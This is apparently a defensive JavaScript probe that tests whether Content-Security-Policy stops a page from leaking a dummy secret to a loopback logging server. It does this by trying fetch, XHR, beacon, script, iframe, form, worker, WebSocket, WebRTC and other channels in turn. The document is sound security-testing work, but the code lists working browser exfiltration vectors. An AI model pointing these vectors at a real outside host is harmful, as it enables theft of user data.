// Every exfiltration mechanism a page can attempt, each tagged so the receiving server
// says which ones actually established egress.
//
// CODEQL: this file deliberately trips `js/functionality-from-untrusted-source` twice, at
// the `script` and `iframe` vectors below (alerts #6 and #7 on PR #553, "Script/Iframe
// loaded using unencrypted connection"). Both are the thing under test, not a defect:
//
//   - This is attack-vector code. Its entire job is to attempt loading executable content
//     from a remote origin, so that `confirm_egress.py` / `redteam_egress2.py` can prove
//     Content-Security-Policy blocks it. A vector that could not attempt the load would
//     measure nothing, and a probe rewritten to satisfy the rule would silently stop
//     testing `script-src` and `frame-src` -- the two directives these vectors exist for.
//   - The "untrusted source" is `http://127.0.0.1:8973`, the harness's own logging server
//     (`serve.py`, which binds 127.0.0.1 on TCP and UDP). Nothing is fetched from a third
//     party and no traffic leaves the machine.
//   - Plain HTTP is required, not incidental. The measurement is whether the request is
//     issued at all; TLS to a loopback listener would add a certificate to the harness
//     without changing what is observed.
//
// None of this ships: the file is a research probe under docs/research/, never imported by
// src/deltatrack, and never served to a user.
//
// The returned string reports what the PAGE saw (attempted / threw). That is diagnostic
// only. The claim is decided by what the SERVER received: under CSP most of these report
// `attempted` with no JavaScript exception and simply produce no request, so a harness
// that checked for thrown errors would report exfiltration as SUCCEEDING.
//
// Vectors the predecessor fixture did not conclusively test, closed here:
//   - form submission: it built a form and never called submit(), so the vector was
//     listed as covered while never having been fired. It now submits into a hidden
//     same-page iframe, which exercises `form-action` without navigating the page away.
//   - webrtc: unchanged here, but the logging server now also listens on UDP, so a STUN
//     binding request can be observed at all. Previously it could not have been.
//   - service-worker registration, worker-originated fetch, @import and webfont loads.
window.__tryAll = async function (tag) {
  const U = (v) => `http://127.0.0.1:8973/${tag}-${v}?secret=BILLTEXT`;
  const out = [];
  const t = async (name, fn) => {
    try {
      await fn();
      out.push(name + ":attempted");
    } catch (e) {
      out.push(name + ":threw(" + e.name + ")");
    }
  };

  await t("fetch", () => fetch(U("fetch"), { mode: "no-cors" }));
  await t("xhr", () => {
    const x = new XMLHttpRequest();
    x.open("GET", U("xhr"));
    x.send();
  });
  await t("beacon", () => {
    navigator.sendBeacon(U("beacon"), "data");
  });
  await t("img", () => {
    const i = new Image();
    i.src = U("img");
    document.body.appendChild(i);
  });
  // CodeQL js/functionality-from-untrusted-source (alert #6): intentional. Exercises
  // CSP `script-src` against the loopback listener; see the header note.
  await t("script", () => {
    const s = document.createElement("script");
    s.src = U("script");
    document.body.appendChild(s);
  });
  await t("css", () => {
    const l = document.createElement("link");
    l.rel = "stylesheet";
    l.href = U("css");
    document.head.appendChild(l);
  });
  await t("cssimport", () => {
    const s = document.createElement("style");
    s.textContent = `@import url("${U("cssimport")}");`;
    document.head.appendChild(s);
  });
  await t("webfont", () => {
    const s = document.createElement("style");
    s.textContent = `@font-face{font-family:XEg;src:url("${U("webfont")}")} .fx{font-family:XEg}`;
    document.head.appendChild(s);
    const d = document.createElement("div");
    d.className = "fx";
    d.textContent = "force the font to load";
    document.body.appendChild(d);
  });
  await t("websocket", () => {
    new WebSocket("ws://127.0.0.1:8973/" + tag + "-ws");
  });
  await t("eventsrc", () => {
    new EventSource(U("eventsource"));
  });
  // CodeQL js/functionality-from-untrusted-source (alert #7): intentional. Exercises
  // CSP `frame-src` against the loopback listener; see the header note.
  await t("iframe", () => {
    const f = document.createElement("iframe");
    f.src = U("iframe");
    document.body.appendChild(f);
  });
  await t("dynimport", () => import(U("dynimport")));

  // FORM SUBMISSION -- actually submitted, into a hidden iframe so `form-action` is
  // exercised without navigating this page away.
  await t("formsubmit", () => {
    const sink = document.createElement("iframe");
    sink.name = tag + "-formsink";
    sink.style.display = "none";
    document.body.appendChild(sink);
    const f = document.createElement("form");
    f.method = "POST";
    f.action = U("form");
    f.target = sink.name;
    const inp = document.createElement("input");
    inp.name = "secret";
    inp.value = "BILLTEXT";
    f.appendChild(inp);
    document.body.appendChild(f);
    f.submit();
  });

  // SERVICE WORKER -- registration is itself a network fetch of the script.
  await t("serviceworker", () => {
    if (!navigator.serviceWorker) throw new DOMException("unsupported", "NotSupportedError");
    return navigator.serviceWorker.register(U("sw"));
  });

  // WORKER-ORIGINATED FETCH -- a separate context from the document.
  await t("workerfetch", () => {
    const src = `fetch("${U("workerfetch")}",{mode:"no-cors"}).catch(function(){});`;
    const blob = new Blob([src], { type: "text/javascript" });
    const w = new Worker(URL.createObjectURL(blob));
    setTimeout(() => w.terminate(), 1500);
  });

  // WEBRTC -- a STUN binding request is UDP; see serve.py's UDP listener.
  await t("webrtc", () => {
    const p = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:8973" }] });
    p.createDataChannel("x");
    return p.createOffer().then((o) => p.setLocalDescription(o));
  });

  await new Promise((r) => setTimeout(r, 2500));
  return out.join("\n");
};
